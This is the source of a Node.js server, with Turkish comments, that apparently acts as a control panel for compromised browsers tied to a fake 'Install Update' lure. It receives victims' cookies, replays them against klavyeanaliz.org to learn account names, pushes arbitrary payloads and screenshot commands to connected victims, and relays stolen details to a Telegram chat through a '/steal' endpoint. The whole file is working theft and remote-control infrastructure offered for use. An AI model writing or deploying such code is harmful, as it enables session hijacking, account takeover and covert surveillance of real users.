const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');
const cheerio = require('cheerio');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' }, compression: true });

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ACCESS_TOKEN = process.env.ACCESS_TOKEN || 'default_token';

const bot = TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false }) : null;

const clients = new Map();
const usernameCache = new Map();
const messageQueue = [];
const screenshotCache = new Map(); // Ekran görüntüleri için önbellek
const MAX_QUEUE_SIZE = 100; // Mesaj kuyruğu için maksimum boyut

app.use(express.json());
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});
app.use(express.static(__dirname));

// Telegram mesaj gönderimi
setInterval(() => {
    if (messageQueue.length > 0 && bot) {
        bot.sendMessage(TELEGRAM_CHAT_ID, messageQueue.join('\n')).catch(err => console.error('Telegram hata:', err.message));
        messageQueue.length = 0;
    }
}, 60000);

app.get('/', (req, res) => {
    const token = req.query.token;
    if (!token || token !== ACCESS_TOKEN) return res.status(403).send('Erişim reddedildi.');
    res.sendFile(__dirname + '/index.html');
});

app.post('/steal', (req, res) => {
    const data = req.body;
    if (data.type === 'update_clicked' && bot) {
        if (messageQueue.length < MAX_QUEUE_SIZE) {
            messageQueue.push(`Güncellemeyi Yükle butonuna tıklandı!\nClient ID: ${data.clientId}\nZaman: ${data.timestamp}\nMesaj: ${data.data}`);
        }
    }
    res.send('Veriler alındı, Boss!');
});

app.post('/sendPayload', (req, res) => {
    const { clientId, payload } = req.body;
    const client = clients.get(clientId);
    if (client) {
        io.to(client.socketId).emit('payload', payload);
        res.send('Payload gönderildi!');
    } else {
        res.status(404).send('Client bulunamadı!');
    }
});

app.post('/fetchUsername', async (req, res) => {
    const { clientId, cookies } = req.body;
    if (usernameCache.has(clientId)) return res.json({ username: usernameCache.get(clientId) });
    try {
        const response = await axios.get('https://klavyeanaliz.org/', { headers: { Cookie: cookies } });
        const $ = cheerio.load(response.data);
        const username = $('a.dropdown-toggle span.text').text().trim() || 'Bulunamadı';
        usernameCache.set(clientId, username);
        setTimeout(() => usernameCache.delete(clientId), 3600000);
        res.json({ username });
    } catch (error) {
        res.status(500).json({ username: 'Hata' });
    }
});

app.post('/takeScreenshot', (req, res) => {
    const { clientId } = req.body;
    const client = clients.get(clientId);
    if (client) {
        io.to(client.socketId).emit('takeScreenshot', clientId);
        res.send('Ekran görüntüsü alma isteği gönderildi!');
    } else {
        res.status(404).send('Client bulunamadı!');
    }
});

// İstemci olaylarını toplu güncelleme için zamanlayıcı
let clientUpdates = [];
let updateTimeout = null;

function scheduleClientUpdate(event, data) {
    clientUpdates.push({ event, data });
    if (!updateTimeout) {
        updateTimeout = setTimeout(() => {
            io.emit('clientUpdate', clientUpdates);
            clientUpdates = [];
            updateTimeout = null;
        }, 5000); // 5 saniyede bir güncelleme
    }
}

io.on('connection', (socket) => {
    socket.on('clientData', (data) => {
        const clientId = data.klavyeId || data.username || data.url || 'Anon_' + Date.now();
        const clientUsername = data.username || clientId;
        const clientCookies = data.cookies || '';
        clients.set(clientId, { socketId: socket.id, username: clientUsername, cookies: clientCookies });
        scheduleClientUpdate('connect', { id: clientId, username: clientUsername, cookies: clientCookies, isActive: true });
        io.emit('clientStatusUpdate', { clientId, isActive: true }); // Anında durum bildirimi
    });

    socket.on('updateName', ({ clientId, newName }) => {
        const client = clients.get(clientId);
        if (client) {
            client.username = newName;
            scheduleClientUpdate('updateName', { id: clientId, username: newName });
        }
    });

    socket.on('requestClientList', () => {
        const clientList = Array.from(clients.entries()).map(([id, c]) => ({
            id,
            username: c.username,
            cookies: c.cookies,
            isActive: true
        }));
        socket.emit('clientList', clientList); // Sadece talep eden istemciye gönder
    });

    socket.on('screenshot', ({ clientId, screenshot }) => {
        screenshotCache.set(clientId, screenshot); // Ekran görüntüsünü önbelleğe al
        setTimeout(() => screenshotCache.delete(clientId), 3600000); // 1 saat sonra temizle
        io.emit('screenshotUpdate', { clientId, screenshot }); // Kontrol paneline bildir
    });

    socket.on('disconnect', () => {
        let disconnectedClientId = null;
        clients.forEach((client, clientId) => {
            if (client.socketId === socket.id) {
                disconnectedClientId = clientId;
                clients.delete(clientId);
                usernameCache.delete(clientId); // Bağlantı kesildiğinde önbelleği temizle
                screenshotCache.delete(clientId); // Ekran görüntüsünü temizle
            }
        });
        if (disconnectedClientId) {
            scheduleClientUpdate('disconnect', { id: disconnectedClientId });
            io.emit('clientStatusUpdate', { clientId: disconnectedClientId, isActive: false }); // Anında durum bildirimi
        }
    });
});

server.listen(3000, () => console.log('Server başladı'));